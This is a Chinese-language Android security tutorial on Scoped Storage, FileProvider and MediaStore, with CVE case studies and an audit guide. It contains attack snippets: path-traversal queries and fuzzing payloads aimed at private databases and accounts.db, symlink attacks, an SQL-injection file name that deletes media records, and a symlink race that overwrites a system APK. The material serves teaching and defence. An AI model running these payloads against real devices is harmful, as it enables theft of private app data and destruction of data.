# 1x03 - 存储隔离 (Scoped Storage)

Android 的存储机制经历了一场从“公共广场”到“私人公寓”的变革。这场变革的核心目标是保护用户隐私并防止应用乱占空间。

## 1. 存储权限的演进

### 1.1 黑暗时代 (Android 9 以前)
- **机制**: 应用只要申请了 `READ_EXTERNAL_STORAGE` 或 `WRITE_EXTERNAL_STORAGE` 权限，就可以访问 `/sdcard` 下的所有文件。
- **风险**: 恶意应用可以读取其他应用的公开数据（如照片、文档），甚至在 SD 卡根目录乱建文件夹。

### 1.2 现代文明：Scoped Storage (Android 10+)
- **机制**: 应用默认只能访问自己的私有目录（`/sdcard/Android/data/<pkg>`）和公共媒体库（通过 MediaStore）。
- **隔离**: 即使拥有存储权限，应用也无法直接通过文件路径访问其他应用的私有文件。

## 2. 底层实现：FUSE 与 Sdcardfs

为了实现 Scoped Storage，Android 在文件系统层做了大量工作：

- **Sdcardfs**: 早期用于模拟 FAT32 权限的内核驱动，但无法提供细粒度的视图隔离。
- **FUSE (Filesystem in Userspace)**: 现代 Android 使用 FUSE 挂载 `/sdcard`。当应用尝试访问文件时，请求会转发到用户空间的 `MediaProvider`。
- **视图过滤**: `MediaProvider` 根据应用的 UID 和权限，动态决定该应用能看到哪些文件。这种机制实现了“同一个路径，不同的视图”。

## 3. 访问外部存储的合法途径

### 3.1 MediaStore API
用于访问照片、视频和音频。应用不需要权限即可贡献文件到媒体库，但读取他人文件需要用户授权。

### 3.2 Storage Access Framework (SAF)
通过系统选择器（Picker）让用户选择特定的文件或目录。
- **安全优势**: 应用不需要任何存储权限，因为它只获得了用户明确选择的那个文件的临时访问权。

### 3.3 FileProvider
用于在应用间安全地共享文件。

**安全配置示例 (`res/xml/file_paths.xml`)**:
```xml
<paths>
    <!-- 仅共享私有缓存目录下的 images 子目录 -->
    <cache-path name="my_images" path="images/" />
</paths>
```

**AndroidManifest.xml**:
```xml
<provider
    android:name="androidx.core.content.FileProvider"
    android:authorities="com.example.app.fileprovider"
    android:exported="false"
    android:grantUriPermissions="true">
    <meta-data
        android:name="android.support.FILE_PROVIDER_PATHS"
        android:resource="@xml/file_paths" />
</provider>
```

## 4. 真实漏洞案例分析

### 4.1 CVE-2019-2219 - MediaProvider 路径遍历

**影响版本**：Android 8.0 - 10.0

**漏洞原理**：

在 Scoped Storage 引入之前，`MediaProvider` 在处理 `_data` 列（文件路径）时未进行充分的路径规范化。

```java
// 简化的漏洞代码（MediaProvider）
public Cursor query(Uri uri, String[] projection, ...) {
    String path = uri.getQueryParameter("path");
    
    // 危险：直接使用用户提供的路径
    File file = new File(path);
    if (!file.exists()) {
        return null;
    }
    
    // 返回文件信息（包括内容）
    MatrixCursor cursor = new MatrixCursor(projection);
    cursor.addRow(new Object[]{file.getName(), file.length(), ...});
    return cursor;
}
```

**攻击演示**：

```java
// 恶意应用
Uri uri = Uri.parse("content://media/external/file");
uri = uri.buildUpon()
    .appendQueryParameter("path", "/data/data/com.android.settings/shared_prefs/settings.xml")
    .build();

Cursor cursor = getContentResolver().query(uri, null, null, null, null);
// 成功读取其他应用的私有文件！
```

**利用价值**：
- 读取任意应用的私有文件（SharedPreferences、数据库）
- 窃取登录凭证、API token
- 提取加密密钥

**修复**：
1. 添加路径白名单：只允许访问公共媒体目录
2. 使用 `realpath()` 规范化路径，检测 `../` 遍历
3. 引入 Scoped Storage，从根本上限制访问范围

### 4.2 CVE-2020-0418 - FileProvider 符号链接攻击

**漏洞原理**：

`FileProvider` 在处理共享文件时，未检查符号链接，导致可以读取任意文件。

```xml
<!-- 配置文件 file_paths.xml -->
<paths>
    <external-path name="shared" path="shared/" />
    <!-- 意图：只共享 /sdcard/Android/data/com.example/shared/ -->
</paths>
```

**攻击步骤**：

```bash
# 1. 在共享目录创建符号链接
adb shell
cd /sdcard/Android/data/com.example.app/shared/
ln -s /data/data/com.victim.app/databases/sensitive.db evil.db

# 2. 通过 FileProvider 请求该文件
content://com.example.app.fileprovider/shared/evil.db
```

**结果**：应用以自己的权限读取了 victim.app 的数据库文件。

**防御**：
```java
// 安全的文件共享代码
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    File file = getFileForUri(uri);
    
    // 检查符号链接
    try {
        String canonicalPath = file.getCanonicalPath();
        String realPath = file.getAbsolutePath();
        
        if (!canonicalPath.equals(realPath)) {
            throw new IllegalArgumentException("Symlink not allowed");
        }
        
        // 检查是否在白名单目录内
        if (!isInWhitelistedDir(canonicalPath)) {
            throw new SecurityException("Path not allowed");
        }
    } catch (IOException e) {
        throw new IllegalArgumentException("Invalid path");
    }
    
    return ParcelFileDescriptor.open(file, ...);
}
```

### 4.3 CVE-2021-0478 - MediaStore 注入攻击

**漏洞原理**：

`MediaStore` 在处理批量插入时，未正确验证文件名，导致 SQL 注入。

```java
// 漏洞代码（简化）
public Uri insert(Uri uri, ContentValues values) {
    String fileName = values.getAsString(MediaStore.MediaColumns.DISPLAY_NAME);
    
    // 危险：直接拼接 SQL
    String sql = "INSERT INTO files (name, path) VALUES ('" + fileName + "', ...)";
    db.execSQL(sql);
}
```

**攻击**：

```java
ContentValues values = new ContentValues();
values.put(MediaStore.MediaColumns.DISPLAY_NAME, 
    "test.jpg'); DELETE FROM files WHERE ('1'='1");  // SQL 注入

getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
// 删除了 MediaStore 数据库中的所有文件记录
```

**影响**：
- DoS：清空媒体库数据
- 数据泄露：通过 UNION 查询提取敏感信息
- 权限提升：修改文件所有者信息

**修复**：使用参数化查询（Prepared Statements）。

### 4.4 CVE-2022-20006 - Download Provider 路径劫持

**场景**：DownloadManager 下载文件到公共目录

**漏洞**：

```java
// 用户请求下载到 /sdcard/Download/file.apk
DownloadManager.Request request = new DownloadManager.Request(uri);
request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "file.apk");
```

**攻击**：
1. 攻击者在下载完成前，抢先创建符号链接：
   ```bash
   ln -s /data/app/com.system.app/base.apk /sdcard/Download/file.apk
   ```
2. DownloadManager 以 system 权限写入，覆盖系统应用
3. 实现提权或代码注入

**防御**：
- 下载前检查目标路径是否已存在
- 使用 `O_EXCL` 标志创建文件（原子操作）
- 下载到私有目录，完成后再移动

## 5. 存储安全审计方法

### 5.1 快速定位存储相关接口

**枚举 ContentProvider**：
```bash
# 列出所有 Provider
adb shell dumpsys package providers | grep -A 10 "Provider"

# 查看特定应用的 Provider
adb shell dumpsys package com.example.app | grep -A 20 "ContentProvider"
```

**常见高危 Provider**：
- `MediaStore` (`content://media/`)
- `DownloadProvider` (`content://downloads/`)
- `FileProvider` (自定义 authority)
- `DocumentsProvider` (SAF)

### 5.2 测试路径遍历

**手动测试**：
```bash
# 测试 FileProvider 路径遍历
adb shell content query --uri "content://com.example.fileprovider/files/../../../data/data/com.victim/databases/sensitive.db"

# 测试 MediaStore 注入
adb shell content insert --uri "content://media/external/file" \
    --bind _data:s:"/data/system/users/0/accounts.db"
```

**自动化 Fuzzing**：
```python
#!/usr/bin/env python3
import subprocess

# Fuzz FileProvider 路径
payloads = [
    "../../../data/data/com.android.settings/shared_prefs/",
    "..%2F..%2F..%2Fdata%2Fsystem%2Faccounts.db",
    "....//....//data/system/",
    "/data/system/%00trusted.db",
]

for payload in payloads:
    uri = f"content://com.example.fileprovider/files/{payload}"
    result = subprocess.run(
        ["adb", "shell", "content", "query", "--uri", uri],
        capture_output=True
    )
    
    if result.returncode == 0 and b"Row:" in result.stdout:
        print(f"[!] 可能存在路径遍历: {payload}")
        print(result.stdout.decode())
```

### 5.3 检查符号链接防护

**创建测试符号链接**：
```bash
adb shell
cd /sdcard/Android/data/com.example.app/files/

# 创建指向敏感文件的符号链接
ln -s /data/system/users/0/settings_system.xml evil.xml

# 尝试通过 ContentProvider 访问
content query --uri "content://com.example.fileprovider/files/evil.xml"
```

**预期安全行为**：
- 应返回错误或拒绝访问
- 不应跟随符号链接

### 5.4 审计 FileProvider 配置

**检查 `file_paths.xml`**：
```xml
<!-- 不安全的配置 -->
<paths>
    <!-- 危险：暴露整个外部存储 -->
    <external-path name="external" path="." />
    
    <!-- 危险：暴露整个私有目录 -->
    <files-path name="all_files" path="." />
    
    <!-- 危险：暴露根目录 -->
    <root-path name="root" path="." />
</paths>

<!-- 安全的配置 -->
<paths>
    <!-- 只共享特定子目录 -->
    <cache-path name="shared_images" path="images/" />
    <files-path name="pdfs" path="documents/pdf/" />
</paths>
```

**检查清单**：
- [ ] 是否使用了 `<root-path>`？（极度危险）
- [ ] 是否使用了 `path="."`？（暴露整个目录）
- [ ] 是否限制了子目录？
- [ ] 是否设置了 `android:grantUriPermissions="true"`？
- [ ] 是否正确使用了 `FLAG_GRANT_*` 标志？

### 5.5 Frida 动态监控

**Hook FileProvider 文件访问**：
```javascript
Java.perform(function() {
    var FileProvider = Java.use("androidx.core.content.FileProvider");
    
    FileProvider.getUriForFile.overload(
        'android.content.Context', 
        'java.lang.String', 
        'java.io.File'
    ).implementation = function(context, authority, file) {
        var filePath = file.getAbsolutePath();
        console.log("[FileProvider] getUriForFile:");
        console.log("  authority: " + authority);
        console.log("  path: " + filePath);
        
        // 检测可疑路径
        if (filePath.indexOf("..") !== -1 || 
            filePath.indexOf("/data/data") !== -1) {
            console.log("[!] 可疑路径访问！");
            console.log(Java.use("android.util.Log").getStackTraceString(
                Java.use("java.lang.Exception").$new()
            ));
        }
        
        return this.getUriForFile(context, authority, file);
    };
    
    // Hook openFile
    FileProvider.openFile.implementation = function(uri, mode) {
        console.log("[FileProvider] openFile:");
        console.log("  uri: " + uri);
        console.log("  mode: " + mode);
        
        var result = this.openFile(uri, mode);
        return result;
    };
});
```

**监控 MediaStore 操作**：
```javascript
// Hook MediaStore 插入操作
Java.perform(function() {
    var ContentResolver = Java.use("android.content.ContentResolver");
    
    ContentResolver.insert.implementation = function(uri, values) {
        if (uri.toString().indexOf("media") !== -1) {
            console.log("[MediaStore] insert:");
            console.log("  uri: " + uri);
            
            if (values != null) {
                var keys = values.keySet().toArray();
                for (var i = 0; i < keys.length; i++) {
                    var key = keys[i];
                    var value = values.get(key);
                    console.log("  " + key + " = " + value);
                    
                    // 检测 SQL 注入尝试
                    if (value && value.toString().indexOf("'") !== -1) {
                        console.log("[!] 可能的 SQL 注入！");
                    }
                }
            }
        }
        
        return this.insert(uri, values);
    };
});
```

## 6. 存储安全最佳实践

### 6.1 开发者指南

**1. 使用 Scoped Storage（Android 10+）**
```kotlin
// 写入媒体文件（推荐）
val resolver = contentResolver
val contentValues = ContentValues().apply {
    put(MediaStore.MediaColumns.DISPLAY_NAME, "photo.jpg")
    put(MediaStore.MediaColumns.MIME_TYPE, "image/jpeg")
    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
}

val uri = resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues)
uri?.let {
    resolver.openOutputStream(it)?.use { outputStream ->
        // 写入数据
    }
}
```

**2. 安全配置 FileProvider**
```xml
<!-- 最小权限原则 -->
<paths>
    <cache-path name="shared_images" path="images/" />
</paths>
```

```kotlin
// 授予临时权限
val uri = FileProvider.getUriForFile(
    context,
    "${context.packageName}.fileprovider",
    file
)

val intent = Intent(Intent.ACTION_VIEW).apply {
    setDataAndType(uri, "image/*")
    flags = Intent.FLAG_GRANT_READ_URI_PERMISSION  // 只读
    // 避免 FLAG_GRANT_WRITE_URI_PERMISSION，除非必需
}
```

**3. 路径验证**
```kotlin
fun isSafePath(file: File, baseDir: File): Boolean {
    return try {
        val canonical = file.canonicalPath
        val base = baseDir.canonicalPath
        
        // 必须在基准目录内
        canonical.startsWith(base)
    } catch (e: IOException) {
        false
    }
}
```

### 6.2 审计 Checklist

| 检查项 | 风险 | 检测方法 |
|--------|------|----------|
| **路径遍历** | 读取任意文件 | 测试 `../` 绕过 |
| **符号链接** | 越权读写 | 创建 symlink 测试 |
| **SQL 注入** | 数据泄露/DoS | Fuzz 文件名字段 |
| **FileProvider 过度暴露** | 私有文件泄露 | 审计 `file_paths.xml` |
| **URI 权限泄露** | 临时授权滥用 | 检查 `FLAG_GRANT_*` |
| **TOCTOU** | 竞态条件 | 并发访问测试 |

## 7. 总结：Android 9 vs Android 11 差异对比

| 特性 | Android 9 (Legacy) | Android 11 (Scoped) |
| :--- | :--- | :--- |
| **直接文件访问** | 允许访问整个 `/sdcard` | 仅限私有目录和特定媒体目录 |
| **权限要求** | 需要 `READ/WRITE` 权限 | 访问媒体库需要权限，SAF 不需要 |
| **底层挂载** | 通常是 sdcardfs | 强制使用 FUSE 视图隔离 |
| **隐私保护** | 弱，应用可互相偷窥 | 强，默认完全隔离 |
| **路径遍历风险** | 高（缺少隔离） | 低（FUSE 过滤） |
| **符号链接** | 可被利用 | 部分缓解 |

**关键演进**：
- Android 10：引入 Scoped Storage（可选）
- Android 11：强制 Scoped Storage
- Android 12+：细化媒体权限（READ_MEDIA_IMAGES/VIDEO/AUDIO）
- Android 13+：细粒度照片选择器

## 参考（AOSP）

- **Android 存储架构**：https://source.android.com/docs/core/storage
- **Scoped Storage**：https://source.android.com/docs/core/storage/scoped
- **应用沙盒（存储部分）**：https://source.android.com/docs/security/app-sandbox
- **SELinux 文件标签**：https://source.android.com/docs/security/features/selinux
